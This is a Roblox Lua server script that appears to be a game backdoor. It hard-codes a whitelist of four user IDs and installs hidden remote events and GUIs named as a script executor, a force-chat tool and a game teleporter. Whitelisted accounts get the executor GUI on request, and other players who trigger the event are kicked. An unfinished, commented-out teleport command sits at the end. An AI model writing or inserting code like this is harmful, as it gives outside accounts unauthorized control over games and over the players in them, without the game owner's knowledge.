local whitelist = {
	130030450; -- illudethis
	2454561387; -- thatrandomnoob23
	5799589926; -- superegglauncher
	2591123755; -- dudeonroblox12
}

-- unpack

local gui = script:WaitForChild("scriptrexecutorgui")
local gui2 = script:WaitForChild("forcechatgui")
local gui3 = script:WaitForChild("gameteleporter")
local msgevent = script:WaitForChild("displaymsg")
local clientscriptunpack = script:WaitForChild("unpackclient")
local chatmsg = script:WaitForChild("ToggleCmd")
local sendchatmsg = script:WaitForChild("sendchatmsg")
local requestexecutor = script:WaitForChild("requestexecutor")
local getwhitelist = script:WaitForChild("getwhitelist")
gui.Parent = game:GetService("ServerScriptService")
gui2.Parent = game:GetService("ServerScriptService")
gui3.Parent = game:GetService("ServerScriptService")
msgevent.Parent = game:GetService("ReplicatedStorage")
clientscriptunpack.Parent = game:GetService("StarterGui")
chatmsg.Parent = game:GetService("TextChatService")
sendchatmsg.Parent = game:GetService("ReplicatedStorage")
requestexecutor.Parent = game:GetService("ReplicatedStorage")
getwhitelist.Parent = game:GetService("ReplicatedStorage")

repeat task.wait() until #game:GetService("Players"):GetPlayers() > 0
  
task.wait(0.01)

requestexecutor.OnServerEvent:Connect(function(player)
	if table.find(whitelist, player.UserId) then
		print("recieved request for executor: plrname =", player.Name)
		if player.PlayerGui:FindFirstChild("scriptexecutorgui") then return end
		
		gui:Clone().Parent = player.PlayerGui
		msgevent:FireClient(player, 'succesfully executed "executor" command')
	else
		print(player.Name, "attempted to use executor, invalid perms, kicking player...")
		player:Kick("no")
	end
end)

getwhitelist.OnServerInvoke = function(player)
	if table.find(whitelist, player.UserId) then
		return true
	end
	
	return false
end


--if player.Name == "illudethis" then
--	player.Chatted:Connect(function(message)
--		if message == "!join" then
--			local teleportService = game:GetService("TeleportService")
--			local players = game:GetService("Players")
--			local player = players.LocalPlayer
--			local character = player.Character or player.CharacterAdded:Wait()
--			local humanoid = character:WaitForChild("Humanoid")
--			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
--			local destinationId = 148
--		end
--	end)
--end




